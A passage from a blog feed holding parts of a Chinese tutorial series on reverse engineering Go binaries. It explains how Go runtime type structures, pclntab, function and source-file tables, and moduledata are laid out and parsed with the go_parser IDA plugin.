<p>即在 <strong>rtype</strong> 数据后面放置了 3 个成员，对逆向分析最有用的是 <strong>inCount</strong> 和 <strong>outCount</strong>。<strong>inCount</strong> 其实就是参数的个数；<strong>outCount</strong> 是返回值个数。紧随其后的就是每个参数类型定义的地址、每个返回值类型定义的地址。 <strong><a href="https://github.com/0xjiayu/go_parser" target="_blank" rel="external">go_parser</a></strong> 解析好的一个 Func Type 如下：</p>
<p><img src="/imgs/go_re/func_type.png" alt=""></p>
<h4 id="8-4-7-Map-Type"><a href="#8-4-7-Map-Type" class="headerlink" title="8.4.7 Map Type"></a>8.4.7 Map Type</h4><p>Map Type 就是映射或者字典类型，由 Key 和 Value 构成。Map Type 的源码定义如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">type</span> mapType <span class="keyword">struct</span> &#123;</div><div class="line">	rtype</div><div class="line">	key    *rtype <span class="comment">// map key type</span></div><div class="line">	elem   *rtype <span class="comment">// map element (value) type</span></div><div class="line">	bucket *rtype <span class="comment">// internal bucket structure</span></div><div class="line">	<span class="comment">// function for hashing keys (ptr to key, seed) -&gt; hash</span></div><div class="line">	hasher     <span class="function"><span class="keyword">func</span><span class="params">(unsafe.Pointer, <span class="keyword">uintptr</span>)</span> <span class="title">uintptr</span></span></div><div class="line">	<span class="title">keysize</span>    <span class="title">uint8</span>  // <span class="title">size</span> <span class="title">of</span> <span class="title">key</span> <span class="title">slot</span></div><div class="line">	<span class="title">valuesize</span>  <span class="title">uint8</span>  // <span class="title">size</span> <span class="title">of</span> <span class="title">value</span> <span class="title">slot</span></div><div class="line">	<span class="title">bucketsize</span> <span class="title">uint16</span> // <span class="title">size</span> <span class="title">of</span> <span class="title">bucket</span></div><div class="line">	<span class="title">flags</span>      <span class="title">uint32</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>可见 Map Struct 比较复杂，在 <strong>rtype</strong> 数据后附加了比较多的字段，而其中对逆向分析比较有帮助的只有 2 个：<strong>key</strong> 和 <strong>elem</strong>，顾名思义，就是 <strong>key</strong> 指向的类型定义数据和 <strong>element(value)</strong> 的数据类型定义数据。<strong><a href="https://github.com/0xjiayu/go_parser" target="_blank" rel="external">go_parser</a></strong> 解析好的一个 Map Type 如下：</p>
<p><img src="/imgs/go_re/map_type.png" alt=""></p>
<blockquote>
<p><strong>NOTE</strong>:</p>
<p>如果 Go 版本 &lt;1.14，Map Type 里是没有 <strong><code>hasher</code></strong> 这个字段的。</p>
</blockquote>
<h4 id="8-4-8-Chan-Type"><a href="#8-4-8-Chan-Type" class="headerlink" title="8.4.8 Chan Type"></a>8.4.8 Chan Type</h4><p>Chan Type，即<strong>Channel(通道)</strong>类型，是 Go 中一个比较特殊的数据类型。这个类型主要是用来在 Goroutine 之间传递消息、同步数据，是 Go 原生高并发特性的支撑要素之一。Chan Type 的源码定义如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">type</span> chanType <span class="keyword">struct</span> &#123;</div><div class="line">    rtype</div><div class="line">    elem *rtype  <span class="comment">// channel element type</span></div><div class="line">    dir  <span class="keyword">uintptr</span> <span class="comment">// channel direction (ChanDir)</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>一个 Channel 在使用时，只能传输一种类型的数据，在声明或者创建时，要指定一个可传输的数据类型，比如创建一个可传输 int 类型值的 channel：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ch := make(chan int)</div></pre></td></tr></table></figure>
<p>另外，Go 中的 Channel 是有方向的。虽然 Channel 默认既可以发送数据，也可以接收数据，但也可以通过指定方向让它做到只能发送或只能接收数据。</p>
<p>所以，上面可以看到 Chan Type 的源码定义中，在 <strong>rtype</strong> 数据后附加了两个字段：指向一个可发送的数据类型的定义的地址 <strong>elem</strong>，和一个代表 Channel 方向（单向接收为 1；单向发送为 2，双向收发为 3）的值。<strong><a href="https://github.com/0xjiayu/go_parser" target="_blank" rel="external">go_parser</a></strong> 解析好的一个 Chan Type 如下：</p>
<p><img src="/imgs/go_re/chan_type.png" alt=""></p>
<h4 id="8-4-9-Ucommon-Type"><a href="#8-4-9-Ucommon-Type" class="headerlink" title="8.4.9 Ucommon Type"></a>8.4.9 Ucommon Type</h4><p>前面提了多次可以绑定 Methods 的 <strong>Uncommon Type</strong>，具体是什么样的呢？源码定义如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// uncommonType is present only for defined types or types with methods</span></div><div class="line"><span class="comment">// (if T is a defined type, the uncommonTypes for T and *T have methods).</span></div><div class="line"><span class="comment">// Using a pointer to this struct reduces the overall size required</span></div><div class="line"><span class="comment">// to describe a non-defined type with no methods</span></div><div class="line"><span class="keyword">type</span> uncommonType <span class="keyword">struct</span> &#123;</div><div class="line">    pkgPath nameOff <span class="comment">// import path; empty for built-in types like int, string</span></div><div class="line">    mcount  <span class="keyword">uint16</span>  <span class="comment">// number of methods</span></div><div class="line">    xcount  <span class="keyword">uint16</span>  <span class="comment">// number of exported methods</span></div><div class="line">    moff    <span class="keyword">uint32</span>  <span class="comment">// offset from this uncommontype to [mcount]method</span></div><div class="line">    _       <span class="keyword">uint32</span>  <span class="comment">// unused</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>任何一个 Type，无论是 Basic Type 还是 Composite Type，都可以是 Uncommon Type。如果一个 Type 的 <strong>tflag</strong> 字段标记该 Type 时 <strong>Uncommon Type</strong>，那么在该 Type 前面所有的字段之后，就是 <strong>Uncommon Type</strong> 的信息了。</p>
<p>第一个字段是 <strong>pkgPath</strong>，这个字段的用法与 <strong>Interface Type</strong> 中的 <strong>pkgPath</strong> 相同。</p>
<p>第二个字段是 <strong>mcount</strong>，即所有绑定的 Methods 的数量；第三个字段 <strong>xcount</strong> 则是可导出的 Methods 的数量，即 Method name 首字母大写。第 4 个字段，是 Methods 列表到 <strong>Uncommon Type</strong> 信息起始地址的 <strong>偏移</strong>。</p>
<p>Uncommon Type 这里绑定的 Method，与 Interface 那里声明的 <strong>Interface Method</strong> 定义还不一样：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">type</span> method <span class="keyword">struct</span> &#123;</div><div class="line">    name nameOff <span class="comment">// name of method</span></div><div class="line">    mtyp typeOff <span class="comment">// method type (without receiver) // offset to an *rtype</span></div><div class="line">    ifn  textOff <span class="comment">// fn used in interface call (one-word receiver) // offset from top of text section</span></div><div class="line">    tfn  textOff <span class="comment">// fn used for normal method call // offset from top of text section</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ul>
<li><strong>name</strong> 是相对于 <strong>firstmoduledata.types</strong> 的一个偏移，两者相加之后得出的地址指向一个 <strong>type name</strong> 结构，解析出来就是 Method name；</li>
<li><strong>mtyp</strong> 也是对于 <strong>firstmoduledata.types</strong> 的一个便宜，两者相加之后得出的地址，指向一个 Type 定义信息，其实就是 Method 的声明信息；</li>
<li>后面的 <strong>ifn/tfn</strong> 通常指向这个 Method 实际的函数实现，不过一个是面向 Interface 的，一个就是普通的实现。</li>
</ul>
<p>综合起来，一个简单的 Uncommon Type 由<strong><a href="https://github.com/0xjiayu/go_parser" target="_blank" rel="external">go_parser</a></strong> 解析好的效果如下：</p>
<p><img src="/imgs/go_re/uncommon_type.png" alt=""></p>
<h3 id="8-5-总结"><a href="#8-5-总结" class="headerlink" title="8.5 总结"></a>8.5 总结</h3><p>至此，本文阐述了如何遍历找到 Go 二进制文件中每一个 Type 的定义信息，以及每一个 Type 源码级的定义和解析方式。之后就可以基于这些知识完成对 Go 二进制文件中 Types 信息的解析了。</p>
<h2 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h2><ol>
<li><a href="https://github.com/0xjiayu/go_parser" target="_blank" rel="external">https://github.com/0xjiayu/go_parser</a></li>
<li><a href="https://www.anquanke.com/post/id/214940" target="_blank" rel="external">https://www.anquanke.com/post/id/214940</a></li>
<li><a href="https://www.anquanke.com/post/id/215419" target="_blank" rel="external">https://www.anquanke.com/post/id/215419</a></li>
<li><a href="https://golang.org/src/runtime/type.go" target="_blank" rel="external">https://golang.org/src/runtime/type.go</a></li>
<li><a href="https://golang.org/src/runtime/malloc.go" target="_blank" rel="external">https://golang.org/src/runtime/malloc.go</a></li>
<li><a href="https://www.pnfsoftware.com/blog/analyzing-golang-executables/" target="_blank" rel="external">https://www.pnfsoftware.com/blog/analyzing-golang-executables/</a></li>
<li><a href="http://home.in.tum.de/~engelke/pubs/1709-ma.pdf" target="_blank" rel="external">http://home.in.tum.de/~engelke/pubs/1709-ma.pdf</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;本文首发于安全客: &lt;a href=&quot;https://www.anquanke.com/post/id/215820&quot;&gt;https://www.anquanke.com/post/id/215820&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;书接前文，本文详细介绍 Go 二进制文件中的数据类型信息，如何定位并解析所有数据类型的定义。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;传送门&lt;/strong&gt;：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/214940&quot;&gt;Go二进制文件逆向分析从基础到进阶(1)——综述&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/215419&quot;&gt;Go二进制文件逆向分析从基础到进阶(2)——MetaInfo、函数符号和源码文件路径列表&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;8-types&quot;&gt;&lt;a href=&quot;#8-types&quot; class=&quot;headerlink&quot; title=&quot;8. types&quot;&gt;&lt;/a&gt;8. types&lt;/h2&gt;&lt;h3 id=&quot;8-1-简介&quot;&gt;&lt;a href=&quot;#8-1-简介&quot; class=&quot;headerlink&quot; title=&quot;8.1 简介&quot;&gt;&lt;/a&gt;8.1 简介&lt;/h3&gt;&lt;p&gt;重温一下本系列第一篇《&lt;a href=&quot;https://www.anquanke.com/post/id/214940&quot;&gt;Go二进制文件逆向分析从基础到进阶——综述&lt;/a&gt;》文末介绍的 Go 语言中的数据类型。Go 在构建二进制文时把项目中所有数据类型信息也打包到二进制文件中，这些数据类型信息主要为 Go 语言中的 Stack Trace、Type Reflection 和类型转换服务。Go 语言内置的标准数据类型如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://p3.ssl.qhimg.com/t010f01af0e76e97c60.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="security" scheme="http://jiayu0x.com/categories/security/"/>
    
    
      <category term="security" scheme="http://jiayu0x.com/tags/security/"/>
    
      <category term="malwr" scheme="http://jiayu0x.com/tags/malwr/"/>
    
      <category term="re" scheme="http://jiayu0x.com/tags/re/"/>
    
      <category term="golang" scheme="http://jiayu0x.com/tags/golang/"/>
    
  </entry>
  
  <entry>
    <title>Go二进制文件逆向分析从基础到进阶(1)——MetaInfo、函数符号和源码文件路径列表</title>
    <link href="http://jiayu0x.com/2020/08/28/go-binary-reverse-engineering-metainfo-symbols-and-srcfile-path/"/>
    <id>http://jiayu0x.com/2020/08/28/go-binary-reverse-engineering-metainfo-symbols-and-srcfile-path/</id>
    <published>2020-08-27T16:00:00.000Z</published>
    <updated>2020-09-25T10:04:16.205Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>本文首发于安全客: <a href="https://www.anquanke.com/post/id/215419" target="_blank" rel="external">https://www.anquanke.com/post/id/215419</a></p>
<p>书接前文，本文主要介绍 Go 二进制文件中 Meta Information 的解析，与<strong>函数符号</strong>和<strong>源码文件路径列表</strong>的提取。最后详细介绍一下 <strong>Moduledata</strong> 这个结构。</p>
<p>传送门： <a href="https://www.anquanke.com/post/id/214940" target="_blank" rel="external">Go二进制文件逆向分析从基础到进阶(1)——综述</a></p>
</blockquote>
<h2 id="5-Meta-information"><a href="#5-Meta-information" class="headerlink" title="5. Meta information"></a>5. Meta information</h2><h3 id="5-1-Go-Build-ID"><a href="#5-1-Go-Build-ID" class="headerlink" title="5.1 Go Build ID"></a>5.1 Go Build ID</h3><p>每一个 Go 二进制文件内，都有一个独一无二的 Build ID，详情参考 <a href="https://golang.org/src/cmd/go/internal/work/buildid.go" target="_blank" rel="external">src/cmd/go/internal/work/buildid.go</a> 。Go Build ID 可以用以下命令来查看：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ go tool buildid &lt;GoBinaryFilePath&gt;</div></pre></td></tr></table></figure>
<p>对于 ELF 文件，也可以用 <strong>readelf</strong> 命令查看，不过看到的只是 Hex String：</p>
<p><img src="/imgs/go_re/go_buildid.png" alt=""></p>
<p>转换一下上图的 Hex String，就是 <code>$ go buildid tracker_nonstrip</code> 的显示结果了：</p>
<p><img src="/imgs/go_re/buildid_hex2str.png" alt=""></p>
<a id="more"></a>
<p>另外，如果是用 <strong>gccgo</strong> 编译的 ELF 文件，用 <strong>file</strong> 命令 或者 <strong>readelf</strong> 命令还能看到 <strong><a href="https://fedoraproject.org/wiki/Releases/FeatureBuildId" target="_blank" rel="external">GNU Build ID</a></strong> ，注意区分一下：</p>
<p><img src="/imgs/go_re/gnu_buildid.png" alt=""></p>
<p>Build ID 是 Go 二进制文件中的元信息之一，但是对逆向分析二进制文件并没有什么实际帮助，本文只做简单介绍。</p>
<h3 id="5-2-Go-Version"><a href="#5-2-Go-Version" class="headerlink" title="5.2 Go Version"></a>5.2 Go Version</h3><p>Go 二进制文件中，还会把构建本文件的 Go 语言版本号打包进去。查看方式有以下 2 种：</p>
<ol>
<li><p>通过 IDAPro 中的 strings 检索：</p>
<p><img src="/imgs/go_re/go_version.png" alt=""></p>
</li>
<li><p>通过 Go 语言官方命令 <code>$ go version [FILE]</code> ，该命令不指定文件则打印本地安装的 Go 语言版本，指定文件则打印目标文件对应的 Go 语言版本：</p>
<p><img src="/imgs/go_re/go_ver_cmd.png" style="zoom:70%;"></p>
</li>
</ol>
<h3 id="5-3-GOROOT"><a href="#5-3-GOROOT" class="headerlink" title="5.3 GOROOT"></a>5.3 GOROOT</h3><p><strong>GOROOT</strong> 是 Go 语言的安装路径，里面有 Go 的标准库和自带的命令行工具。一般来说，Go 的二进制文件中都会把 <strong>GOROOT</strong> 打包进去，并在 <code>runtime.GOROOT()</code> 函数中会用到这个值。比如某 Go 样本中打包的 <code>runtime.GOROOT()</code> 函数，可以看到构建该样本所在主机的 <strong>GOROOT</strong> 路径是 <code>/usr/lib/go</code> ：</p>
<p><img src="/imgs/go_re/runtime_GOROOT.png" style="zoom:60%;"></p>
<p>看 Go 标准库中 <code>runtime.GOROOT()</code> 函数的<a href="https://golang.org/src/runtime/extern.go" target="_blank" rel="external">源码</a> ，会发现这个路径其实叫 <strong>sys.DefaultGoroot</strong> ：</p>
<p><img src="/imgs/go_re/runtime_GOROOT_srccode.png" style="zoom:50%;"></p>
<p>至于如何提取这个字符串，就需要在 IDAPro 中先把函数名符号恢复出来，然后根据函数名找到 <code>runtime.GOROOT()</code> 这个函数，最后在这个函数中提取出 <strong>sys.DefaultGoroot</strong> 的值。提取方法可能有多种，<strong><a href="https://github.com/0xjiayu/go_parser/blob/master/common.py#L80" target="_blank" rel="external">go_parser for IDAPro 中的方法</a></strong> 是先解析该函数的 <strong>FlowChart</strong> ，找到最后带 return 的 FlowChart，然后再找出该值的地址。</p>
<p>那么知道了这个信息，对逆向分析有什么用处？后文描述如何提取、过滤 Go 二进制文件中的源码路径列表时会用到。</p>
<h2 id="6-pclntab"><a href="#6-pclntab" class="headerlink" title="6. pclntab"></a>6. pclntab</h2><h3 id="6-1-pclntab-介绍"><a href="#6-1-pclntab-介绍" class="headerlink" title="6.1 pclntab 介绍"></a>6.1 pclntab 介绍</h3><p><strong>pclntab</strong> 全名是 <strong>Program Counter Line Table</strong>，可直译为 <strong>程序计数器行数映射表</strong>， 在 Go 中也叫  <strong>Runtime Symbol Table</strong>， 所以我把它里面包含的信息叫做 <strong>RTSI(Runtime Symbol Information)</strong>。2013 年由 <strong>Russ Cox</strong> (Go 语言创始团队成员，核心开发者)从 <strong>Plan9</strong> 移植到 <strong>Go 1.2</strong> 上，至今没有太大变化。至于 PC(Program Counter)，是给 Go 语言的 runtime 来操作的，可以粗浅理解为 runtime 当前执行的程序代码(或指令)。</p>
<p>按 Russ Cox 在《<strong><a href="http://golang.org/s/go12symtab" target="_blank" rel="external">Go 1.2 Runtime Symbol Information</a></strong>》中的说法，引入 <strong>pcnlntab</strong> 这个结构的最初动机，是为 <strong>Stack Trace</strong> 服务的。参考前文《<strong><a href="https://www.anquanke.com/post/id/214940" target="_blank" rel="external">Go二进制文件逆向分析从基础到进阶——综述</a></strong>》中 <strong>redress</strong> 工具的报错信息，当程序运行出错要 <strong>panic</strong> 的时候，runtime 需要知道当前的位置，层级关系如 pkg-&gt;src file-&gt;function or method-&gt;line number，每一层的信息 runtime 都要知道。Go 就把这些信息结构化地打包到了编译出的二进制文件中。除此之外，<strong>pcnlntab</strong> 中还包含了栈的动态管理用到的栈帧信息、垃圾回收用到的栈变量的生命周期信息以及二进制文件涉及的所有源码文件路径信息。</p>
<p><strong>pclntab</strong> 的概要结构如下（其中的 <strong>strings</strong> 指的是 Function name string、Source File Path string，并不是整个程序中用到的所有 strings）：</p>
<blockquote>
<p><strong>pclntab</strong>:</p>
<ul>
<li>func table</li>
<li>_func structs</li>
<li>pcsp</li>
<li>psfile</li>
<li>pcline</li>
<li>pcdata</li>
<li>strings</li>
<li>file table</li>
</ul>
</blockquote>
<p>而我们最关心的信息，其实主要是 2 个：<strong>函数表(func table)</strong> 和 <strong>源码文件路径列表(file table)</strong>。针对性的 <strong>pclntab</strong> 结构如下：</p>
<p><img src="/imgs/go_re/pclntab_st.png" style="zoom:70%;"></p>
<p>简单解释一下：</p>
<ul>
<li><strong>pclntab</strong> 开头 4-Bytes 是从 Go1.2 至今不变的 <strong>Magic Number</strong>： <strong>0xFFFFFFFB</strong> ；</li>
<li>第 5、6个字节为 0x00，暂无实际用途；</li>
<li>第 7 个字节代表 <strong>instruction size quantum</strong>， <strong>1</strong> 为 x86, 4 为 ARM；</li>
<li>第 8 个字节为地址的大小，32bit 的为 4，64 bit 的为 8，至此的前 8 个字节可以看作是 <strong>pclntab</strong> 的 Header；</li>
<li>第 9 个字节开始是 <strong>function table</strong> 的起始位置，第一个 uintptr 元素为函数(pc, Program Counter) 的个数；</li>
<li>第 2 个 uintptr 元素为第 1 个函数(pc0) 的地址，第 3 个 uintptr 元素为第 1 个函数结构定义相对于 <strong>pclntab</strong> 的偏移，后面的函数信息就以此类推；</li>
<li>直到 function table 结束，下面就是 Source file table。Source file table 以 4 字节(<strong>int32</strong>)为单位，前 4 个字节代表 Source File 的数量，后面每一个 <strong>int32</strong> 都代表一个 Source File Path String 相对于 <strong>pclntab</strong> 的偏移；</li>
<li><strong>uintptr</strong> 代表一个指针类型，在 32bit 二进制文件中，等价于 <strong>uint32</strong>，在 64bit 二进制文件中，等价于 <strong>uint64</strong> 。</li>
</ul>
<p><strong>pclntab</strong> 在源码中是<a href="https://golang.org/src/debug/gosym/pclntab.go" target="_blank" rel="external">如此定义</a>的，构建二进制文件时，<strong>RTSI</strong> 也是在二进制文件中按上面顺序排列的。所以，在 IDAPro 中解析 <strong>pclntab</strong>，就按照如上说明来解析即可。<strong><a href="https://github.com/0xjiayu/go_parser" target="_blank" rel="external">go_parser</a></strong> 在 IDAPro 中解析好的 <strong>pclntab</strong> 开头部分如下：</p>
<p><img src="/imgs/go_re/pclntab_in_ida.png" alt=""></p>
<p>关于如何查找、定位到 <strong>pclntab</strong>，下文详述。</p>
<h3 id="6-2-函数表"><a href="#6-2-函数表" class="headerlink" title="6.2 函数表"></a>6.2 函数表</h3><p>函数表(func table)的起始地址，为 <code>(pclntab_addr + 8)</code>，第一个元素( uintptr <strong>N</strong>) 代表函数的个数，如上图中的 <strong>0x1C3A</strong>。</p>
<p>解析来就是每两个 uintptr 元素为一组，即 <code>(func_addr, func_struct_offset)</code>，每组第一个元素为函数的地址，第二个元素为函数结构体定义相对于 <strong>pclntab</strong> 起始地址的偏移。即：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">func_struct_addr = pclntab_addr + func_struct_offset</div><div class="line"></div><div class="line"># 以上图第一个函数 internal_cpu_Initialize() 为例，pclntab 的地址为 0x8FBFA0，它的 func_struct_offset 为 0x1C3C0</div><div class="line"># 那么它的 func struct address 为：</div><div class="line">0x8FBFA0 + 0x1C3C0 = 0x918360</div></pre></td></tr></table></figure>
<p>地址 0x918360 处的 Function Struct 是什么模样？下图为 <strong><a href="https://github.com/0xjiayu/go_parser" target="_blank" rel="external">go_parser</a></strong> 在 IDAPro 中解析好的结果：</p>
<p><img src="/imgs/go_re/func_st_in_ida.png" alt=""></p>
<p>Function Struct 在 Russ Cox 的《<strong><a href="http://golang.org/s/go12symtab" target="_blank" rel="external">Go 1.2 Runtime Symbol Information</a></strong>》有介绍：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> Func</div><div class="line">&#123;</div><div class="line">    uintptr      entry;     <span class="comment">// start pc</span></div><div class="line">    int32        name;      <span class="comment">// name (offset to C string)</span></div><div class="line">    int32        args;      <span class="comment">// size of arguments passed to function</span></div><div class="line">    int32        frame;     <span class="comment">// size of function frame, including saved caller PC</span></div><div class="line">    int32        pcsp;      <span class="comment">// pcsp table (offset to pcvalue table)</span></div><div class="line">    int32        pcfile;    <span class="comment">// pcfile table (offset to pcvalue table)</span></div><div class="line">    int32        pcln;      <span class="comment">// pcln table (offset to pcvalue table)</span></div><div class="line">    int32        nfuncdata; <span class="comment">// number of entries in funcdata list</span></div><div class="line">    int32        npcdata;   <span class="comment">// number of entries in pcdata list</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>对于逆向分析来说，这里最有用的信息，就是<strong>函数名</strong>了。如上图所示，函数名是一个以 <code>0x00</code> 结尾的 C-String。在 Function Struct 中，第二个元素只是 int32 类型的偏移值，而函数名字符串的地址，则用以下方式计算得出：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">func_name_addr = pclntab_addr + Dword(func_stuct_addr + sizeof(uintptr))</div><div class="line"></div><div class="line"># 比如上面函数 internal_cpu_Initialize() 的 func_struct_addr 为 0x918360，</div><div class="line"># 它的 Func Name String Offset 为 0x1C408，那么它的 Func Name String Address 就是</div><div class="line">0x8FBFA0(pclntab_addr) + 0x1C408 = 0x9183A8</div></pre></td></tr></table></figure>
<p>如此一来，就从 Go 二进制文件中恢复出了一个函数的名字。用这种方式遍历 Function Table，便可以<strong>恢复所有函数名</strong>。</p>
<p>有的师傅可能还会问，Function Struct 中第 3 个元素 <strong>args</strong> ，有没有对逆向分析有用的信息？如果知道函数的参数、返回值信息，岂不更爽。这个……曾经有，现在，真没有了。在 Go 标准库源码 <strong><a href="https://golang.org/src/debug/gosym/symtab.go" target="_blank" rel="external">src/debug/gosym/symtab.go</a></strong> 中解析这个 Function Struct 的一个类型定义中，有两条注释，说 Go 1.3 之后就没这种信息了：</p>
<p><img src="/imgs/go_re/func_st_in_src.png" style="zoom:50%;"></p>
<p>另外，还有一些函数用上面的方式无法解析，是编译器做<strong>循环展开</strong>时自动生成的匿名函数，也叫 <strong><a href="[https://en.wikipedia.org/wiki/Duff%27s_device](https://en.wikipedia.org/wiki/Duff&#39;s_device">Duff’s Device</a>)</strong>，函数体型如下图：</p>
<p><img src="/imgs/go_re/duff_device.png" style="zoom:70%;"></p>
<p>这样的函数知道它是用来连续操作内存(拷贝、清零等等)的就可以。</p>
<h3 id="6-3-源码文件路径"><a href="#6-3-源码文件路径" class="headerlink" title="6.3 源码文件路径"></a>6.3 源码文件路径</h3><p>在 <strong>pclntab</strong> 中，函数表下面隔一个 uintptr 的位置，就是源码文件表(Srouce File Table) 的 <strong>偏移</strong>，长度为 4-Bytes：</p>
<p><img src="/imgs/go_re/srcfiletab_offset.png" alt=""></p>
<p>这个偏移，是相对 <strong>pclntab</strong> 的起始地址来说的。接着上面的例子，<strong>pclntab</strong> 的地址为 0x8FBFA0，此处偏移量为 0x22FDD0 ，那么源码文件路径列表的地址就是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">srcfiletab_addr = pclntab_addr + srcfiletab_offset</div><div class="line">0x8FBFA0 + 0x22FDD0 = 0xB2BD70</div></pre></td></tr></table></figure>
<p>在 IDAPro 中，0xB2BD70 处  <strong><a href="https://github.com/0xjiayu/go_parser" target="_blank" rel="external">go_parser</a></strong> 解析好的效果如下：</p>
<p><img src="/imgs/go_re/srcfiletab_in_ida.png" alt=""></p>
<p>Source File Table 中的元素全都以 4-Bytes(uint32) 为单位，第一个元素(0x2CF)是本二进制文件涉及的所有源码文件的个数，包括标准库的源码文件、第三方 Pacakge 的源码文件以及当前项目的源码文件。后续每个 uint32 元素代表一个相对于 <strong>pclntab</strong> 的偏移量，该偏移量加上 <strong>pclntab</strong> 的起始地址，即为相应源码文件路径字符串的起始地址。每个源码文件路径名都是以 <code>0x00</code> 结尾的 C-String。</p>
<p> <strong><a href="https://github.com/0xjiayu/go_parser" target="_blank" rel="external">go_parser</a></strong> 对此的处理，是计算出每个偏移量对应的地址，然后创建字符串，并为当前偏移所在的地址创建 data reference，在 IDAPro 中双击 data reference 即可跳转到相应的字符串地址。比如，第一个源码文件的偏移量为 0x239134，那么它对应的实际地址为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0x8FBFA0(pclntab_addr) + 0x239134 = 0xB350D4</div></pre></td></tr></table></figure>
<p>查看地址 0xB350D4 处的字符串即可印证：</p>
<p><img src="/imgs/go_re/singe_srcfile_path.png" alt=""></p>
<p>另外， <strong><a href="https://github.com/0xjiayu/go_parser" target="_blank" rel="external">go_parser</a></strong> 如果成功定位到 <strong>runtime.GOROOT()</strong> 函数，并解析出 <strong>sys.DefaultGoroot</strong> 的值，还会根据这个值过滤掉所有标准库源码文件路径和第三方 Package 源码文件路径，在 IDAPro 的 Console 中只打印本项目相关的所有源码文件路径；如果没能提取出 <strong>sys.DefaultGoroot</strong> ，则会打印所有源码文件路径。DDG 样本中的源码文件路径列表如下所示(IDAPro Console)：</p>
<p><img src="/imgs/go_re/srcfile_list_output.png" style="zoom:80%;"></p>
<h2 id="7-moduledata"><a href="#7-moduledata" class="headerlink" title="7. moduledata"></a>7. moduledata</h2><h3 id="7-1-moduledata-介绍"><a href="#7-1-moduledata-介绍" class="headerlink" title="7.1 moduledata 介绍"></a>7.1 moduledata 介绍</h3><p>在 Go 语言的体系中，Module 是比 Package 更高层次的概念，具体表现在一个 Module 中可以包含多个不同的 Package，而每个 Package 中可以包含多个目录和很多的源码文件。</p>
<blockquote>
<p><strong>“A module is a collection of related Go packages that are versioned together as a single unit.”*</strong><br><em>— Go Module Docs</em></p>
</blockquote>
<p>详情参考：《<strong><a href="https://medium.com/@ckeyes88/go-modules-in-real-life-87a21fb4d8aa" target="_blank" rel="external">Go Modules in Real Life</a></strong>》</p>
<p>相应地，<strong>Moduledata</strong> 在 Go 二进制文件中也是一个更高层次的数据结构，它包含很多其他结构的索引信息，可以看作是 Go 二进制文件中 RTSI(Runtime Symbol Information) 和 RTTI(Runtime Type Information) 的 <strong>地图</strong>。<strong>Moduledata</strong> <a href="https://golang.org/src/runtime/symtab.go" target="_blank" rel="external">源码定义</a>如下(关键字段看注释)：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">type</span> moduledata <span 